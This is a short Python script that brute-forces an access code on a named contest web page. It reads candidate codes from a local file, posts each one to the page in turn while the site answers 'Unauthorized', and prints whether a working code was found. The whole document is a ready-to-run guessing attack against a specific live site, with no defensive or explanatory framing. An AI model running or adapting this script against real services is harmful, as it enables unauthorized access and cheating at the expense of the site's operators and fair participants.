import requests


url = 'http://www.sogeticampustour.fr/concours'
liste = []
taille = 0
with open("file.txt") as f:
    for line in f:
       val = line
       taille +=1
       liste.append(val)
data = dict(code=val)
liste = [each.replace('\n', '') for each in liste]

i = 0
r = requests.post(url, data='lrl', allow_redirects=True)
print(taille)
while i < taille and str(r.content)=='b\'Unauthorized\'':

	data = dict(code=liste[i])

	r = requests.post(url, data=data, allow_redirects=True)
	print(str(r.content) + ' : ' + str(data['code']) +'\n')
	i+=1
if i ==taille:
	print('NOT FOUND')
else:
	print("FOUND")